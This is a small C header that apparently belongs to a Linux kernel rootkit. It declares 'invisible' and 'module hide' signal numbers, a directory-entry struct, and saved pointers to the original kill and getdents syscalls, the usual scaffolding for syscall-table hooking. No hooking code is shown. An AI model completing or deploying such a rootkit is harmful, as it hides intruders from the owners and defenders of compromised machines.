#ifndef OSCW_DEF_H_
#define OSCW_DEF_H_

#include <linux/syscalls.h>

enum {
    SIGINVIS = 10,
    SIGMODHIDE = 12
};

struct linux_dirent {
    unsigned long	d_ino;
    unsigned long	d_off;
    unsigned short	d_reclen;
    char		    d_name[1];
};

typedef asmlinkage long (*syscall_t)(const struct pt_regs *);

extern syscall_t original_kill;
extern syscall_t original_getdents;
extern syscall_t original_getdents64;

#endif // OSCW_DEF_H_
